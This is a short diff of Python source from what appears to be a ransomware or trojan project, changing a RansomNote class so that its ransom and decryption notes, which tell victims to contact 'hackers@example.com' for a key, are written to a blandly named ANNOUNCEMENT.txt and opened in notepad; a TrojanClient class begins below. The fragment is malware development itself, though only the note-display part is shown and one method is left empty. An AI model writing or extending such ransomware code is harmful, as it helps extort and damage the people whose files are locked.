@@ -96,9 +96,9 @@ class RansomNote:
         To get the key and decrypt your files, contact us.
         hackers@example.com
         """
-        with open("README_ENCRYPT.txt", "w", encoding="utf-8") as f:
+        with open("ANNOUNCEMENT.txt", "w", encoding="utf-8") as f:
             f.write(note)
-        os.system("notepad README_ENCRYPT.txt")
+        os.system("notepad ANNOUNCEMENT.txt")
 
     @staticmethod
     def display_decryption_note():
@@ -106,13 +106,13 @@ class RansomNote:
         🔓 All your files have been decrypted!
         Your system is restored and your files are back to normal.
         """
-        with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
+        with open("ANNOUNCEMENT.txt", "w", encoding="utf-8") as f:
             f.write(note)
-        os.system("notepad README_DECRYPT.txt")
+        os.system("notepad ANNOUNCEMENT.txt")
     
     @staticmethod
     def del_note():
-
+        
 
 
 class TrojanClient:
